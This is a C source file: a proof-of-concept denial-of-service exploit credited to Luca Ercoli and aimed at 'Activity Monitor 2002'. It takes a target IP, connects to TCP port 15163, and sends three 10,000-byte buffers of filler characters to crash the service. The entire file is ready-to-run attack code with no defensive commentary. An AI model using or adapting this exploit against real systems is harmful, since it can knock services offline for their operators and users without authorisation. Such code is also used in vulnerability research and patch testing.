#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>



int main(int argc, char **argv)
{

  int i,ck,port,sd;
  char dos[10000];

  struct sockaddr_in act_mon_server;

  if(argc < 2)
  {
    printf("\nUsage: %s <ip>\n", argv[0]);
    exit(0);
  }

  port = 15163;

  for(i = 0; i < 10000; i++) dos[i] = 'x';

  act_mon_server.sin_family = AF_INET;
  act_mon_server.sin_port = htons((u_short)port);
  act_mon_server.sin_addr.s_addr = (long)inet_addr(argv[1]);

  sd = socket(AF_INET, SOCK_STREAM, 0);

  ck = connect(sd, (struct sockaddr *) &act_mon_server, sizeof
(act_mon_server));

  if(ck != 0) {
    perror("Connect");
    exit(0);
    }

  printf("\n\t\tProof of Concept Activity Monitor 2002 DoS\n");
  printf("\t\tby Luca Ercoli luca.ercoli@inwind.it\n\n");

  write(sd, dos, sizeof(dos));
  write(sd, dos, sizeof(dos));
  write(sd, dos, sizeof(dos));

  printf("\nDoS sent!\n");

  close(sd);

  exit(0);
}

